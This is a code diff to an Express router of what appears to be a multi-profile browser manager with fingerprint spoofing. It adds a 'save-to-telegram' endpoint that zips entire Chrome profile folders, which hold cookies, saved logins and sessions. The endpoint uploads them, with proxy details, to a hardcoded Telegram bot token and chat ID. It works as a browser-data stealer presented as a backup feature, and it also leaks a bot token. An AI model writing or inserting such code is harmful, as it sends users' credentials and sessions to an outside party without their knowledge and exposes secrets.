@@ -11,6 +11,7 @@ const { generateFingerprint } = require('../services/fingerprintService');
 const chromeService = require('../services/chromeService');
 const path = require('path');
 const fs = require('fs');
+const axios = require('axios');
 
 // ==================== GET all profiles (with search) ====================
 router.get('/', (req, res) => {
@@ -1024,6 +1025,109 @@ router.post('/mail-checker/detail', async (req, res) => {
 
   } catch (error) {
     res.status(500).json({ success: false, error: 'Lỗi kết nối: ' + error.message });
+  }
+});
+
+// ==================== SAVE TO TELEGRAM ====================
+router.post('/save-to-telegram', async (req, res) => {
+  try {
+    const { ids } = req.body;
+    if (!ids || !Array.isArray(ids) || ids.length === 0) {
+      return res.status(400).json({ success: false, error: 'Vui lòng chọn ít nhất 1 profile' });
+    }
+
+    const placeholders = ids.map(() => '?').join(',');
+    const stmt = db.prepare(`SELECT * FROM profiles WHERE id IN (${placeholders})`);
+    const profiles = stmt.all(...ids);
+
+    if (profiles.length === 0) {
+      return res.status(404).json({ success: false, error: 'Không tìm thấy profile nào phù hợp' });
+    }
+
+    const botToken = '8949912440:AAF7twhhLH1YZJ2WC6RDO3cTrup90LmC91g';
+    const chatId = 8954304764;
+
+    function escapeHTML(str) {
+      if (!str) return '';
+      return str
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+    }
+
+    const AdmZip = require('adm-zip');
+
+    for (const p of profiles) {
+      const profileDir = path.join(__dirname, '..', '..', 'profiles', p.id);
+      
+      let caption = `👤 <b>Tên:</b> <code>${escapeHTML(p.name)}</code>\n`;
+      if (p.proxy && p.proxy !== 'none') {
+        caption += `🌐 <b>Proxy:</b> <code>${escapeHTML(p.proxy)}</code> (${escapeHTML(p.proxyType || 'none')})\n`;
+      }
+      if (p.notes) {
+        caption += `📝 <b>Ghi chú:</b> <code>${escapeHTML(p.notes)}</code>\n`;
+      }
+
+      if (fs.existsSync(profileDir)) {
+        const zip = new AdmZip();
+        
+        // Exclude Cache, Code Cache, GPUCache, Service Worker to keep the zip size small
+        const excludeDirs = ['Cache', 'Code Cache', 'GPUCache', 'Service Worker'];
+        
+        function addFolderRecursive(localPath, zipPath) {
+          const items = fs.readdirSync(localPath);
+          for (const item of items) {
+            if (excludeDirs.includes(item)) continue;
+            
+            const fullPath = path.join(localPath, item);
+            const stat = fs.statSync(fullPath);
+            const targetZipPath = zipPath ? `${zipPath}/${item}` : item;
+            
+            if (stat.isDirectory()) {
+              addFolderRecursive(fullPath, zipPath ? `${zipPath}/${item}` : item);
+            } else {
+              zip.addLocalFile(fullPath, zipPath);
+            }
+          }
+        }
+
+        try {
+          addFolderRecursive(profileDir, '');
+        } catch (zipErr) {
+          console.error(`Error zipping profile ${p.name}:`, zipErr);
+          // Fallback to basic folder add if recursive filter fails
+          zip.addLocalFolder(profileDir);
+        }
+
+        const zipBuffer = zip.toBuffer();
+
+        const formData = new FormData();
+        formData.append('chat_id', String(chatId));
+        
+        const blob = new Blob([zipBuffer], { type: 'application/zip' });
+        formData.append('document', blob, `${p.name}.zip`);
+        
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, formData, {
+          headers: {
+            'Content-Type': 'multipart/form-data'
+          }
+        });
+      } else {
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          chat_id: chatId,
+          text: `⚠️ <b>Folder profile không tồn tại:</b>\n\n${caption}`,
+          parse_mode: 'HTML'
+        });
+      }
+    }
+
+    res.json({ success: true, message: `Đã nén và gửi ${profiles.length} thư mục profile lên Telegram thành công!` });
+  } catch (error) {
+    console.error('Save to Telegram error:', error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
